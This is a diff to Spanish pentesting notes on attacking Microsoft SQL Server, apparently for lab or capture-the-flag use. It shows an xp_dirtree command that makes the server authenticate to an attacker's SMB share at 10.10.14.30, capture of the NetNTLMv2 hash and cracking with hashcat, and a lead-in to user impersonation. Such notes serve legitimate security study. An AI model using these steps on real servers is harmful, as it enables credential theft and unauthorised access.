@@ -67,7 +67,7 @@ Si nos autenticamos con un usuario Windows, podemos hacerlo con la flag `-window
 ```bash
 impacket-mssqlclient $username@$target -p 1433 -windows-auth
 ```
-Puede ser útil obtener el hashNTMLv2 del usuario `mssqlsvc` y tras craquear la contraseña conectarnos nuevamente con este usuario  y `-windows-auth` 
+Puede ser útil obtener el hashNTMLv2 (`NTLMv2 challenge/response`) del usuario `mssqlsvc` y tras craquear la contraseña conectarnos nuevamente con este usuario  y `-windows-auth` 
 
 ## Enumeración de Bases de Datos
 
@@ -150,10 +150,10 @@ Usando procedimientos almacenados `xp_dirtree` o `xp_subdirs` para enviar una so
     ```
 2. Ejecuta en MSSQL:
     ```mssql
-    EXEC xp_dirtree '\\10.10.10.1\share\';
+    EXEC xp_dirtree '\\10.10.14.30\share\';
     GO
     ```
- 3. Capturamos hash `NetNTLMv2` y hacemos fuerza bruta con hashcat -`m 5600`   
+ 3. Capturamos hash `NetNTLMv2`  (`NTLMv2 challenge/response`) y hacemos fuerza bruta con hashcat -`m 5600`   
 ### Suplantación de Usuarios (MSSQL)
 El servidor SQL tiene unos servicios especiales, `IMPERSONATE`,  que permite ejecutar al usuario acciones con los permisos de otro usuario
 1. Comprobar si nuestro usuario tiene permisos de administrador:
